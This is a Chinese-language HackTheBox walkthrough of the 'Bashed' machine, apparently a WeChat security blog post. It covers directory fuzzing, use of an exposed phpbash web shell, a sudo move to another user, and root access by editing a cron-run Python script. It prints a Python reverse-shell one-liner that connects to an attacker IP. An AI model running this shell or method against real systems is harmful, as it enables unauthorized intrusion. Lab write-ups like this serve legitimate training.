> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/CCDKQSiQZrgPJA-QE732Xw)

一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)

  

  

大家好，这里是 **大余安全** 的第 **121** 篇文章，本公众号会每日分享攻防渗透技术给大家。

![](https://mmbiz.qpic.cn/mmbiz_png/sGWlDp8sFCl67vCmcZr3JtQP0jB8suQiaKaKCVYPOezloiaicS8xMkAriaAQd3dTOPXicBTVStlX66kEffEWJOiczUTA/640?wx_fmt=png)

靶机地址：https://www.hackthebox.eu/home/machines/profile/118

靶机难度：初级（4.5/10）

靶机发布日期：2017 年 12 月 20 日

靶机描述：

Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted

请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/o62ddIpxjBd0kv6p3zb6uf1GiaCo9PiaF12hWQQSurxFPuVIDtsNTgUpjjvmib7GxKXNePVMAwJfzuib52MWoORPYg/640?wx_fmt=png)

一、信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/Clq0o4fE5u6X5A1maTmqcvtEibdrsDO41kZPibRCHsX3Koj69GFK2qOyPwdcrgcDkHklrdJzBCiaQPuMVe11oSYHA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOKshsaNg4EC44xXK62EqbDUh43P7JsGBjTxDhZ7oW7dXC0wgpPkGVibCw/640?wx_fmt=png)  

可以看到靶机的 IP 是 10.10.10.68....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOKe3kDGb6k5K0Fr5PicwquWUBQP2KIzO7WCRB3M2FCFePttJUOH2mSTyg/640?wx_fmt=png)

发现只开放了 80 端口...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOKYfSlQXNKvylYfPpqpNKT3ic257yN6bPh34zWVIkibkB2BYkibdibF3lJMw/640?wx_fmt=png)

浏览 web 直接跳过....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOKJkiamG1gERzX0p0onkvbMbLAmK7wG93rLaYLic0ib9f6mGJUpeAwhthjg/640?wx_fmt=png)

直接爆破目录...

Dirbuster 发现了 dev 目录，其中包含 phpbash 脚本...

phpbash 是个反向外壳... 去看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOKIgj7ibS6Ria8JpgXolkuH8gh4AGuYP7eA2B3KkeRkBIicgomoKanBVaTw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOKe2D6HyiawpcpAn0icNmXezFToSGBAoJ2V0PLw2wWEXBo8uOkljOTzV6g/640?wx_fmt=png)

直接利用反向外壳，文件上传提权即可....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOKgRAw4EybVnENQ5h4WKDx24fUWIicqia6usX6HV06YO4miaFSOwGCO9XUg/640?wx_fmt=png)

上传 php 简单 shell，获得了低权外壳....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOKKnA2TXWoCThPEib1uF19sxcib1AF2kvVyNFA4Ou8ptBARmvAKeWvTv5A/640?wx_fmt=png)

通过低权外壳，获得了 user_flag 信息....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOK2YCdjnNgUEv4bMaCww0KShliaoB2Kyn7iaIyawQTZDlxdHaVlbA6ehrw/640?wx_fmt=png)

sudo -l 发现 all，无需任何密码可以直接 bash 到 scriptmanager 用户...

sudo -u 获得了 scriptmanager 用户权限....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOKOibUWRuDxMXP8VK2k6vBqg5jIRibvjVOm3mb81gQpbNDhSNnTIVpYPaQ/640?wx_fmt=png)

枚举时发现 scripts 底层存在 test 文件脚本信息...

查看 test.py 文件信息，发现 test.py 每分钟执行一次，这可以通过阅读 test.py 并查看 test.txt 的时间戳来推断，该文本文件由 root 拥有，因为 root.txt 是 root 权限执行...

只需要修改 test.py 即可提权...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOKfsQDVpnln8FwHcsic7wrVcljedDPNOX6WZfRJt1I4f4icC7Eicopj7FqA/640?wx_fmt=png)

简单 python_shell...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMywPfdR9SlmGZMs8nwkIOKXNQQhbHvpkkuZuzzDLiaGQMibhU0sCibySn6CKiaDn96WA2gic2eqia3te0g/640?wx_fmt=png)

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.51",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

等待一分钟后，自动提权 root.... 获得了 root_flag 信息...

![](https://mmbiz.qpic.cn/mmbiz_png/sGWlDp8sFCl67vCmcZr3JtQP0jB8suQiaKaKCVYPOezloiaicS8xMkAriaAQd3dTOPXicBTVStlX66kEffEWJOiczUTA/640?wx_fmt=png)

由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台初级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/o62ddIpxjBd0kv6p3zb6uf1GiaCo9PiaF12hWQQSurxFPuVIDtsNTgUpjjvmib7GxKXNePVMAwJfzuib52MWoORPYg/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

大余安全

一个全栈渗透小技巧的公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)